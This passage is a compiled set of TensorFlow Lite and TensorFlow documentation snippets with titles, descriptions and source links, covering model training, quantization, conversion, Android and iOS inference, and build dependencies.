        .add(new QuantizeOp(128.0, 1/128.0))
        .build();
```

----------------------------------------

TITLE: End-to-End Image Classification with TFLite Model Maker Python
DESCRIPTION: This Python snippet demonstrates the core steps for training and exporting a TensorFlow Lite image classification model using the Model Maker library. It covers loading data from a folder, splitting it for training and testing, creating/customizing the model, evaluating its performance, and exporting the final TFLite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/index.md#_snippet_0

LANGUAGE: python
CODE:
```
from tflite_model_maker import image_classifier
from tflite_model_maker.image_classifier import DataLoader

# Load input data specific to an on-device ML app.
data = DataLoader.from_folder('flower_photos/')
train_data, test_data = data.split(0.9)

# Customize the TensorFlow model.
model = image_classifier.create(train_data)

# Evaluate the model.
loss, accuracy = model.evaluate(test_data)

# Export to Tensorflow Lite model and label file in `export_dir`.
model.export(export_dir='/tmp/')
```

----------------------------------------

TITLE: Defining Custom Bazel Rules for Selective TFLite with Select TF Ops (Bazel BUILD)
DESCRIPTION: This Bazel BUILD file snippet defines custom rules for creating selectively built TensorFlow Lite libraries for Android and C++ that include support for Select TensorFlow ops. It uses the `tflite_flex_android_library` and `tflite_flex_cc_library` macros, specifying the list of required models.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/reduce_binary_size.md#_snippet_3

LANGUAGE: bazel
CODE:
```
load(
    "@org_tensorflow//tensorflow/lite/delegates/flex:build_def.bzl",
    "tflite_flex_android_library",
    "tflite_flex_cc_library",
)

# A Select TF ops enabled selectively built TFLite Android library.
tflite_flex_android_library(
    name = "selective_built_tflite_flex_android_lib",
    models = [
        ":model_one.tflite",
        ":model_two.tflite",
    ],
)

# A Select TF ops enabled selectively built TFLite C++ library.
tflite_flex_cc_library(
    name = "selective_built_tflite_flex_cc_lib",
    models = [
        ":model_one.tflite",
        ":model_two.tflite",
    ],
)
```

----------------------------------------

TITLE: Incorrect Usage Example of TFLite `tensor()` (Python)
DESCRIPTION: Demonstrates an incorrect pattern for using the `tensor()` method. It shows how obtaining NumPy views *before* `allocate_tensors()` or holding views across `invoke()` calls can lead to `RuntimeError` because the underlying buffers might be reallocated or invalidated.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/Interpreter.md#_snippet_20

LANGUAGE: python
CODE:
```
input = interpreter.tensor(interpreter.get_input_details()[0]["index"])()
output = interpreter.tensor(interpreter.get_output_details()[0]["index"])()
interpreter.allocate_tensors()  # This will throw RuntimeError
for i in range(10):
  input.fill(3.)
  interpreter.invoke()  # this will throw RuntimeError since input,output
```

----------------------------------------

TITLE: Training MNIST Model TensorFlow Python
DESCRIPTION: Loads and preprocesses the MNIST dataset by normalizing pixel values. It defines a simple sequential Keras model with Conv2D, MaxPooling, Flatten, and Dense layers, compiles it with Adam optimizer and sparse categorical crossentropy loss, and trains it on the preprocessed data for 5 epochs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant.ipynb#_snippet_1

LANGUAGE: python
CODE:
```
# Load MNIST dataset
mnist = tf.keras.datasets.mnist
(train_images, train_labels), (test_images, test_labels) = mnist.load_data()

# Normalize the input image so that each pixel value is between 0 to 1.
train_images = train_images.astype(np.float32) / 255.0
test_images = test_images.astype(np.float32) / 255.0

# Define the model architecture
model = tf.keras.Sequential([
  tf.keras.layers.InputLayer(input_shape=(28, 28)),
  tf.keras.layers.Reshape(target_shape=(28, 28, 1)),
  tf.keras.layers.Conv2D(filters=12, kernel_size=(3, 3), activation='relu'),
  tf.keras.layers.MaxPooling2D(pool_size=(2, 2)),
  tf.keras.layers.Flatten(),
  tf.keras.layers.Dense(10)
])

# Train the digit classification model
model.compile(optimizer='adam',
              loss=tf.keras.losses.SparseCategoricalCrossentropy(
                  from_logits=True),
              metrics=['accuracy'])
model.fit(
  train_images,
  train_labels,
  epochs=5,
  validation_data=(test_images, test_labels)
)
```

----------------------------------------

TITLE: Build ObjectDetector Options with Threshold and Max Results - Kotlin
DESCRIPTION: Initiates building the `ObjectDetector.ObjectDetectorOptions` by creating a builder instance and setting parameters like the score threshold for detected objects and the maximum number of results to return.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/quickstart.md#_snippet_6

LANGUAGE: Kotlin
CODE:
```
val optionsBuilder =
    ObjectDetector.ObjectDetectorOptions.builder()
        .setScoreThreshold(threshold)
        .setMaxResults(maxResults)
```

----------------------------------------

TITLE: Adding TensorFlow Lite Text Task Library Dependencies (Gradle)
DESCRIPTION: This snippet shows the necessary dependencies to include in an Android project's `build.gradle` file (module level) to enable TensorFlow Lite text processing tasks and optional GPU acceleration. It adds the core TensorFlow Lite Task Library for text, along with GPU delegate plugins for hardware acceleration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/question_answer.md#_snippet_0

LANGUAGE: Gradle
CODE:
```
dependencies {
  ...
  // Import tensorflow library
  implementation 'org.tensorflow:tensorflow-lite-task-text:0.3.0'

  // Import the GPU delegate plugin Library for GPU inference
  implementation 'org.tensorflow:tensorflow-lite-gpu-delegate-plugin:0.4.0'
  implementation 'org.tensorflow:tensorflow-lite-gpu:2.9.0'
}
```

----------------------------------------

TITLE: Initializing and Running Object Detection Python
DESCRIPTION: Demonstrates initializing the `ObjectDetector` from configuration options or directly from a model file path, then running inference on an image loaded using `TensorImage.create_from_file`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/object_detector.md#_snippet_6

LANGUAGE: python
CODE:
```
# Imports
from tflite_support.task import vision
from tflite_support.task import core
from tflite_support.task import processor

# Initialization
base_options = core.BaseOptions(file_name=model_path)
detection_options = processor.DetectionOptions(max_results=2)
options = vision.ObjectDetectorOptions(base_options=base_options, detection_options=detection_options)
detector = vision.ObjectDetector.create_from_options(options)

# Alternatively, you can create an object detector in the following manner:
# detector = vision.ObjectDetector.create_from_file(model_path)

# Run inference
image = vision.TensorImage.create_from_file(image_path)
detection_result = detector.detect(image)
```

----------------------------------------

TITLE: Loading Fashion MNIST Dataset (Python)
DESCRIPTION: Fetches the Fashion MNIST dataset, which consists of grayscale images of clothing items. It loads the data into training and testing sets, separating images and their corresponding labels for subsequent preprocessing and model training.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/on_device_training/overview.ipynb#_snippet_2

LANGUAGE: python
CODE:
```
fashion_mnist = tf.keras.datasets.fashion_mnist
(train_images, train_labels), (test_images, test_labels) = fashion_mnist.load_data()
```

----------------------------------------

TITLE: Export Trained Model - Python (Model Maker)
DESCRIPTION: This snippet exports the trained object detection model using the `model.export` method. By default, it exports the TensorFlow Lite model file (`model.tflite`) with embedded metadata, including labels.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/object_detection.ipynb#_snippet_18

LANGUAGE: python
CODE:
```
model.export(export_dir='.')
```

----------------------------------------

TITLE: Passing Detection Results via Listener - TensorFlow Lite - Kotlin
DESCRIPTION: Uses a listener pattern to communicate the results of the object detection back to the calling component, typically the UI layer. Calls the `onResults` method of the `objectDetectorListener` (an instance of `CameraFragment` in the example) and passes the detection results, the inference time, and the dimensions of the processed image.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/quickstart.md#_snippet_14

LANGUAGE: Kotlin
CODE:
```
objectDetectorListener.onResults( // instance of CameraFragment
    results,
    inferenceTime,
    tensorImage.height,
    tensorImage.width)
```

----------------------------------------

TITLE: Batching Character Dataset into Sequences - Python
DESCRIPTION: This code uses the `batch` method on the character dataset to group consecutive character IDs into sequences of length `seq_length + 1`. `drop_remainder=True` ensures that batches are of a fixed size, which is helpful for stateful RNNs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_8

LANGUAGE: python
CODE:
```
sequences = char_dataset.batch(seq_length+1, drop_remainder=True)

for item in sequences.take(5):
  print(repr(''.join(idx2char[item.numpy()])))
```

----------------------------------------

TITLE: Saving and Loading a Trained Model (Python)
DESCRIPTION: Demonstrates how to save a trained model using TensorFlow's `tf.saved_model.save`. It wraps the custom `Model` in a `SaveableModel` to expose the `__call__` method as a concrete function for saving. The saved model is then loaded back, and an assertion verifies that the loaded model produces identical outputs to the original.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_Numpy_Distributed_Image_Classification.ipynb#_snippet_7

LANGUAGE: python
CODE:
```
# A temporary directory to save our models into.
dir = tempfile.TemporaryDirectory()

# We take our model, and create a wrapper for it.
class SaveableModel(Model):
  @tf.function
  def __call__(self, inputs):
    return super().__call__(inputs)

saveable_model = SaveableModel()

# This saves a concrete function that we care about.
outputs = saveable_model(x_test)

# This saves the model to disk.
tf.saved_model.save(saveable_model, dir.name)

loaded = tf.saved_model.load(dir.name)
outputs_loaded = loaded(x_test)

# Ensure that the loaded model preserves the weights
# of the saved model.
assert tnp.allclose(outputs, outputs_loaded)
```

----------------------------------------

TITLE: Retraining with XLA Enabled Python
DESCRIPTION: Resets the Keras session and enables the XLA compiler using `tf.config.optimizer.set_jit(True)`. The model is regenerated and recompiled with the new XLA setting. The data is reloaded to ensure consistency. A warmup epoch is run, followed by timed training of the model with XLA enabled to demonstrate the potential performance benefits.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tf2xla/tutorials/autoclustering_xla.ipynb#_snippet_5

LANGUAGE: python
CODE:
```
# We need to clear the session to enable JIT in the middle of the program.
tf.keras.backend.clear_session()
tf.config.optimizer.set_jit(True) # Enable XLA.
model = compile_model(generate_model())
(x_train, y_train), (x_test, y_test) = load_data()

warmup(model, x_train, y_train, x_test, y_test)
%time train_model(model, x_train, y_train, x_test, y_test)
```

----------------------------------------

TITLE: Run TFLite Model (from Function) Python
DESCRIPTION: This snippet runs the TFLite model created directly from a TensorFlow concrete function. It uses the `run_tflite_model` function with the `tflite_model_2` content and the already pre-processed `input_tensor`. Similar to the previous run without integrated pre/post-processing, it processes the output logits using `tf.argmax` and prints the resulting predicted class.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite_resnet50.ipynb#_snippet_16

LANGUAGE: python
CODE:
```
output_data_2 = run_tflite_model(tflite_model_2, input_tensor)
tfl_predicted_class_idx_2 = tf.argmax(output_data_2, axis=-1).numpy()
print("Predicted class:", model.config.id2label[tfl_predicted_class_idx_2[0]])
```

----------------------------------------

TITLE: Creating TFLite Searcher Model (Python)
DESCRIPTION: Configures the ScaNN (Scalable Nearest Neighbors) options for efficient vector similarity search. This includes setting the distance metric (dot product), tree structure (number of leaves and leaves to search), and quantization settings. The Searcher model is then created using the loaded data and the specified ScaNN configuration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_searcher.ipynb#_snippet_6

LANGUAGE: python
CODE:
```
scann_options = searcher.ScaNNOptions(
      distance_measure="dot_product",
      tree=searcher.Tree(num_leaves=140, num_leaves_to_search=4),
      score_ah=searcher.ScoreAH(dimensions_per_block=1, anisotropic_quantization_threshold=0.2))
model = searcher.Searcher.create_from_data(data_loader, scann_options)
```

----------------------------------------

TITLE: Creating AudioRecord with AudioClassifier Python
DESCRIPTION: Creates an AudioRecord instance that can be used to record audio data suitable for input to the AudioClassifier. This helper method provides a standard way to obtain an audio recording object configured for the model's requirements.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/audio/AudioClassifier.md#_snippet_2

LANGUAGE: Python
CODE:
```
create_audio_record() -> <a href="../../../tflite_support/task/audio/AudioRecord"><code>tflite_support.task.audio.AudioRecord</code></a>
```

----------------------------------------

TITLE: Enable CoreML Delegate on All Devices (C)
DESCRIPTION: Provides the C API method for creating a TfLiteCoreMlDelegate instance with the `enabled_devices` option set to allow the delegate to run on all devices, including those without a Neural Engine.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/coreml_delegate.md#_snippet_6

LANGUAGE: C
CODE:
```
TfLiteCoreMlDelegateOptions options;
    options.enabled_devices = TfLiteCoreMlDelegateAllDevices;
    TfLiteDelegate* delegate = TfLiteCoreMlDelegateCreate(&amp;options);
    // Initialize interpreter with delegate
```

----------------------------------------

TITLE: Add Standalone TFLite GPU Dependencies (Gradle)
DESCRIPTION: Configures the app's build.gradle file to include the necessary standalone TensorFlow Lite library and the standalone GPU delegate plugin module. This setup is intended for use on devices that do not have Google Play Services installed. Requires a standard Android project setup using Gradle.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/gpu.md#_snippet_5

LANGUAGE: Gradle
CODE:
```
dependencies {
    ...
    implementation 'org.tensorflow:tensorflow-lite'
    implementation 'org.tensorflow:tensorflow-lite-gpu-delegate-plugin'
}
```

----------------------------------------

TITLE: Add Standalone TFLite GPU Delegate Dependency
DESCRIPTION: Add dependencies for the standalone TensorFlow Lite library and the GPU delegate plugin to your Android application's build.gradle file. This is required when targeting devices without Google Play services.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/gpu_task.md#_snippet_3

LANGUAGE: Gradle
CODE:
```
dependencies {
  ...
  implementation 'org.tensorflow:tensorflow-lite'
  implementation 'org.tensorflow:tensorflow-lite-gpu-delegate-plugin'
}
```

----------------------------------------

TITLE: Compiling Training and Evaluating Model Python
DESCRIPTION: Defines helper functions `compile_model` and `train_model` to configure and train the Keras model. `compile_model` sets up the optimizer (RMSprop), loss function (categorical crossentropy), and metrics (accuracy). `train_model` fits the model to the data for a specified number of epochs. It also includes a `warmup` function to perform one training epoch without timing, followed by timed training and final evaluation on the test set.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tf2xla/tutorials/autoclustering_xla.ipynb#_snippet_4

LANGUAGE: python
CODE:
```
def compile_model(model):
  opt = tf.keras.optimizers.RMSprop(learning_rate=0.0001)
  model.compile(loss='categorical_crossentropy',
                optimizer=opt,
                metrics=['accuracy'])
  return model

model = compile_model(model)

def train_model(model, x_train, y_train, x_test, y_test, epochs=25):
  model.fit(x_train, y_train, batch_size=256, epochs=epochs, validation_data=(x_test, y_test), shuffle=True)

def warmup(model, x_train, y_train, x_test, y_test):
  # Warm up the JIT, we do not wish to measure the compilation time.
  initial_weights = model.get_weights()
  train_model(model, x_train, y_train, x_test, y_test, epochs=1)
  model.set_weights(initial_weights)

warmup(model, x_train, y_train, x_test, y_test)
%time train_model(model, x_train, y_train, x_test, y_test)

scores = model.evaluate(x_test, y_test, verbose=1)
print('Test loss:', scores[0])
print('Test accuracy:', scores[1])
```

----------------------------------------

TITLE: Initializing and Running Image Classification in Swift
DESCRIPTION: Illustrates the process of initializing the ImageClassifier in Swift. It includes finding the model file in the app bundle, creating options, initializing the classifier, converting a UIImage to an MLImage, and performing classification.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/image_classifier.md#_snippet_3

LANGUAGE: Swift
CODE:
```
// Imports
import TensorFlowLiteTaskVision

// Initialization
guard let modelPath = Bundle.main.path(forResource: "birds_V1",
                                            ofType: "tflite") else { return }

let options = ImageClassifierOptions(modelPath: modelPath)

// Configure any additional options:
// options.classificationOptions.maxResults = 3

let classifier = try ImageClassifier.classifier(options: options)

// Convert the input image to MLImage.
// There are other sources for MLImage. For more details, please see:
// https://developers.google.com/ml-kit/reference/ios/mlimage/api/reference/Classes/GMLImage
guard let image = UIImage (named: "sparrow.jpg"), let mlImage = MLImage(image: image) else { return }

// Run inference
let classificationResults = try classifier.classify(mlImage: mlImage)
```

----------------------------------------

TITLE: Exporting Retrained Model to Various Formats - Python TensorFlow
DESCRIPTION: Saves the trained model and associated files (like labels, vocab) to a specified directory in various formats including TFLite, SavedModel, and TFJS, based on the provided export_format list.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/image_classifier/ImageClassifier.md#_snippet_6

LANGUAGE: Python
CODE:
```
export(
    export_dir,
    tflite_filename='model.tflite',
    label_filename='labels.txt',
    vocab_filename='vocab.txt',
    saved_model_filename='saved_model',
    tfjs_folder_name='tfjs',
    export_format=None,
    **kwargs
)
```

----------------------------------------

TITLE: Converting Keras Model to Quantized TFLite Python
DESCRIPTION: This snippet converts a trained Keras model to the TensorFlow Lite format. It applies dynamic range quantization as an optimization to reduce the model size. The resulting TFLite model is saved to a file named 'pose_classifier.tflite'. It also prints the size of the converted model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/tutorials/pose_classification.ipynb#_snippet_22

LANGUAGE: python
CODE:
```
converter = tf.lite.TFLiteConverter.from_keras_model(model)
converter.optimizations = [tf.lite.Optimize.DEFAULT]
tflite_model = converter.convert()

print('Model size: %dKB' % (len(tflite_model) / 1024))

with open('pose_classifier.tflite', 'wb') as f:
  f.write(tflite_model)
```

----------------------------------------

TITLE: Export Model TensorFlow Lite/SavedModel Python
DESCRIPTION: Exports the trained model using the TensorFlow Model Maker library. It saves the model in both the TensorFlow Lite format (including metadata) and the standard TensorFlow SavedModel format for broader compatibility. Requires a trained model object ('model') and the Model Maker library ('mm').
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/speech_recognition.ipynb#_snippet_17

LANGUAGE: python
CODE:
```
print(f'Exporing the model to {SAVE_PATH}')
model.export(SAVE_PATH, tflite_filename=TFLITE_FILENAME)
model.export(SAVE_PATH, export_format=[mm.ExportFormat.SAVED_MODEL, mm.ExportFormat.LABEL])
```

----------------------------------------

TITLE: Loading and Preprocessing Image Data Python
DESCRIPTION: This snippet downloads an image from a URL, opens it using PIL (Pillow), resizes it to 224x224 pixels, and converts it into a NumPy array. It then adds a batch dimension (axis=0) to make the array shape suitable for model input (e.g., (1, 224, 224, 3)).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/keras/keras_jax_backend_to_tfl.ipynb#_snippet_2

LANGUAGE: python
CODE:
```
from PIL import Image
import requests

url = "https://storage.googleapis.com/download.tensorflow.org/example_images/astrid_l_shaped.jpg"
image = Image.open(requests.get(url, stream=True).raw)
image = image.resize((224, 224))
input_image = np.array(image)
input_image = np.expand_dims(input_image, axis=0)
```

----------------------------------------

TITLE: Running TFLite Benchmark Tool with TF Ops Support (Desktop)
DESCRIPTION: This command executes the `benchmark_model_plus_flex` binary built previously on a desktop machine. It is used to benchmark a TensorFlow Lite model (`model_converted_with_TF_ops.tflite`) that contains operations requiring select TensorFlow operator support.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/README.md#_snippet_3

LANGUAGE: Shell
CODE:
```
bazel-bin/tensorflow/lite/tools/benchmark/benchmark_model_plus_flex \
  --graph=model_converted_with_TF_ops.tflite \
```

----------------------------------------

TITLE: Extracting and Passing Image Data for Detection (Kotlin)
DESCRIPTION: This function receives an `ImageProxy` from CameraX, copies its pixel data into a shared `bitmapBuffer`, retrieves the image rotation, and then calls `objectDetectorHelper.detect()` with the prepared `Bitmap` and rotation information. Requires CameraX and an `ObjectDetectorHelper` instance configured for the model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/object_detection.md#_snippet_10

LANGUAGE: Kotlin
CODE:
```
private fun detectObjects(image: ImageProxy) {
  //Copy out RGB bits to the shared bitmap buffer
  image.use {bitmapBuffer.copyPixelsFromBuffer(image.planes[0].buffer) }
    val imageRotation = image.imageInfo.rotationDegrees
    objectDetectorHelper.detect(bitmapBuffer, imageRotation)
  }
```

----------------------------------------

TITLE: Change Model Architecture Spec - Python (Model Maker)
DESCRIPTION: This snippet demonstrates how to change the base model architecture used by the TensorFlow Lite Model Maker. It sets the `model_spec` to use the `efficientdet_lite4` architecture, allowing training with a larger, potentially more accurate model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/object_detection.ipynb#_snippet_16

LANGUAGE: python
CODE:
```
spec = model_spec.get('efficientdet_lite4')
```

----------------------------------------

TITLE: Adding TFLite Select TF Ops Dependency (MavenCentral) - Gradle
DESCRIPTION: This Gradle snippet shows how to include the prebuilt TensorFlow Lite AAR with select TensorFlow ops support by adding the `tensorflow-lite-select-tf-ops` artifact alongside the standard TFLite AAR in the `dependencies` block, typically using MavenCentral.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_select.md#_snippet_1

LANGUAGE: build
CODE:
```
dependencies {
    implementation 'org.tensorflow:tensorflow-lite:0.0.0-nightly-SNAPSHOT'
    // This dependency adds the necessary TF op support.
    implementation 'org.tensorflow:tensorflow-lite-select-tf-ops:0.0.0-nightly-SNAPSHOT'
}
```

----------------------------------------

TITLE: Define TensorFlow Image Preprocessor Python
DESCRIPTION: This Python function `resnet_image_processor` implements the image pre-processing logic using TensorFlow operations, mirroring the behavior of the Hugging Face `ConvNextImageProcessor`. It takes a raw image tensor, resizes it, normalizes pixel values using ImageNet stats, transposes to channel-first format, and adds a batch dimension, preparing the image for the Resnet50 model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite_resnet50.ipynb#_snippet_4

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np


def resnet_image_processor(image_tensor):
  # 1. Resize and Cast to Float32
  image_resized = tf.image.resize(
      image_tensor, (224, 224), method=tf.image.ResizeMethod.BILINEAR
  )
  image_float = tf.cast(image_resized, tf.float32)

  # 2. Normalize (Using TensorFlow Constants)
  mean = tf.constant([0.485, 0.456, 0.406])
  std = tf.constant([0.229, 0.224, 0.225])
  image_normalized = (image_float / 255.0 - mean) / std

  # 3. Transpose for Channel-First Format
  image_transposed = tf.transpose(image_normalized, perm=[2, 0, 1])

  # 4. Add Batch Dimension
  return tf.expand_dims(image_transposed, axis=0)
```

----------------------------------------

TITLE: Initializing and Running Image Segmenter in Swift (iOS)
DESCRIPTION: This Swift snippet covers importing the necessary module, getting the model path from the app bundle, creating `ImageSegmenterOptions`, initializing the `ImageSegmenter`, converting a `UIImage` to an `MLImage`, and finally running the segmentation inference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/image_segmenter.md#_snippet_3

LANGUAGE: Swift
CODE:
```
// Imports
import TensorFlowLiteTaskVision

// Initialization
guard let modelPath = Bundle.main.path(forResource: "deeplabv3",
                                            ofType: "tflite") else { return }

let options = ImageSegmenterOptions(modelPath: modelPath)

// Configure any additional options:
// options.outputType = OutputType.confidenceMasks

let segmenter = try ImageSegmenter.segmenter(options: options)

// Convert the input image to MLImage.
// There are other sources for MLImage. For more details, please see:
// https://developers.google.com/ml-kit/reference/ios/mlimage/api/reference/Classes/GMLImage
guard let image = UIImage (named: "plane.jpg"), let mlImage = MLImage(image: image) else { return }

// Run inference
let segmentationResult = try segmenter.segment(mlImage: mlImage)
```

----------------------------------------

TITLE: Applying Float16 Quantization (Python)
DESCRIPTION: This snippet performs Float16 quantization. It initializes the converter, sets `optimizations` to `DEFAULT`, and specifies `tf.float16` as a supported type in `target_spec.supported_types`. This reduces model size by quantizing weights to 16 bits.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_quantization.md#_snippet_6

LANGUAGE: Python
CODE:
```
import tensorflow as tf
converter = tf.lite.TFLiteConverter.from_saved_model(saved_model_dir)
converter.optimizations = [tf.lite.Optimize.DEFAULT]
converter.target_spec.supported_types = [tf.float16]
tflite_quant_model = converter.convert()
```

----------------------------------------

TITLE: Profile TensorFlow Float Operations (Python API)
DESCRIPTION: Programmatically profile float operations (FLOPs) within a TensorFlow graph using the tf.profiler Python API. This example uses ProfileOptionBuilder.float_operation() to specify the profiling target.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/profile_model_architecture.md#_snippet_4

LANGUAGE: python
CODE:
```
tf.profiler.profile(
    tf.get_default_graph(),
    options=tf.profiler.ProfileOptionBuilder.float_operation())
```

----------------------------------------

TITLE: Run Inference - TFLite Interpreter API Java
DESCRIPTION: This Java snippet shows the core method call to execute a TensorFlow Lite model using the Interpreter API. It takes input data in `inputBuffer` and places the results in `outputBuffer`, performing the model inference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_12

LANGUAGE: Java
CODE:
```
interpreter.run(inputBuffer, outputBuffer);
```

----------------------------------------

TITLE: Initializing and Running Object Detection C++
DESCRIPTION: Shows how to initialize the `ObjectDetector` from options containing the model file path, create an input `FrameBuffer` from raw image data and dimensions, and perform inference to obtain the detection results in C++.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/object_detector.md#_snippet_7

LANGUAGE: cpp
CODE:
```
// Initialization
ObjectDetectorOptions options;
options.mutable_base_options()->mutable_model_file()->set_file_name(model_path);
std::unique_ptr<ObjectDetector> object_detector = ObjectDetector::CreateFromOptions(options).value();

// Create input frame_buffer from your inputs, `image_data` and `image_dimension`.
// See more information here: tensorflow_lite_support/cc/task/vision/utils/frame_buffer_common_utils.h
std::unique_ptr<FrameBuffer> frame_buffer = CreateFromRgbRawBuffer(
      image_data, image_dimension);

// Run inference
const DetectionResult result = object_detector->Detect(*frame_buffer).value();
```

----------------------------------------

TITLE: Predicting Top-K Results (Python)
DESCRIPTION: Performs predictions on the provided data and returns the top-k results along with their associated probabilities. Accepts evaluation data (DataLoader, TF tensor, or numpy array), the number of top results (k) to predict, and a batch size for processing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/TextClassifier.md#_snippet_7

LANGUAGE: python
CODE:
```
predict_top_k(
    data, k=1, batch_size=32
)
```

----------------------------------------

TITLE: Basic Detect Method Structure - TFLite Task Vision Kotlin
DESCRIPTION: This Kotlin code snippet provides a basic structure for a function that performs object detection using the TFLite Vision Task Library. It includes checks to ensure the TFLite Vision component is initialized and the object detector is set up before proceeding with inference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_2

LANGUAGE: Kotlin
CODE:
```
fun detect(...) {
  if (!TfLiteVision.isInitialized()) {
    Log.e(TAG, "detect: TfLiteVision is not initialized yet")
    return
  }

  if (objectDetector == null) {
    setupObjectDetector()
  }

  ...

}
```

----------------------------------------

TITLE: Evaluate Float Keras Model Accuracy Python
DESCRIPTION: Evaluates the accuracy of the original float Keras model using the prepared test dataset. It computes and prints the Top-5 accuracy to provide a baseline for comparison with the quantized model before debugging.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/quantization_debugger.ipynb#_snippet_4

LANGUAGE: Python
CODE:
```
test_ds = ds.map(lambda data: (data['image'], data['label'] + 1)).batch(16)
loss, acc = model.evaluate(test_ds)
print(f'Top-5 accuracy (float): {acc * 100:.2f}%')
```

----------------------------------------

TITLE: Converting GraphDef with Multiple Input Arrays and Shapes
DESCRIPTION: This command demonstrates converting a Frozen GraphDef that accepts multiple inputs. The `--input_arrays` flag takes a comma-separated list of tensor names, and `--input_shapes` takes a colon-separated list of corresponding input shapes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/r1/convert/cmdline_examples.md#_snippet_8

LANGUAGE: Shell
CODE:
```
tflite_convert \
  --graph_def_file=/tmp/inception_v1_2016_08_28_frozen.pb \
  --output_file=/tmp/foo.tflite \
  --input_arrays=InceptionV1/InceptionV1/Mixed_3b/Branch_1/Conv2d_0a_1x1/Relu,InceptionV1/InceptionV1/Mixed_3b/Branch_2/Conv2d_0a_1x1/Relu,InceptionV1/InceptionV1/Mixed_3b/Branch_3/MaxPool_0a_3x3/MaxPool,InceptionV1/InceptionV1/Mixed_3b/Branch_0/Conv2d_0a_1x1/Relu \
  --input_shapes=1,28,28,96:1,28,28,16:1,28,28,192:1,28,28,64 \
  --output_arrays=InceptionV1/Logits/Predictions/Reshape_1
```

----------------------------------------

TITLE: Loading Data with Custom Spec - TensorFlow Lite Model Maker - Python
DESCRIPTION: Loads data from a CSV file using the `DataLoader` utility, specifying the text and label columns and providing the newly created or customized model specification. This prepares the data for training or evaluation with the new spec.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_24

LANGUAGE: python
CODE:
```
new_train_data = DataLoader.from_csv(
      filename='train.csv',
      text_column='sentence',
      label_column='label',
      model_spec=new_model_spec,
      is_training=True)
```

----------------------------------------

TITLE: Initializing TFLite Model with GPU or CPU Threads (Java)
DESCRIPTION: Demonstrates how to initialize a TensorFlow Lite model wrapper in Java, checking for GPU support using CompatibilityList and setting the device option to GPU or the number of threads for CPU execution accordingly. This allows the application to leverage hardware acceleration when available.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/codegen.md#_snippet_2

LANGUAGE: Java
CODE:
```
    import org.tensorflow.lite.support.model.Model;
    import org.tensorflow.lite.gpu.CompatibilityList;
    import org.tensorflow.lite.gpu.GpuDelegate;

    // Initialize interpreter with GPU delegate
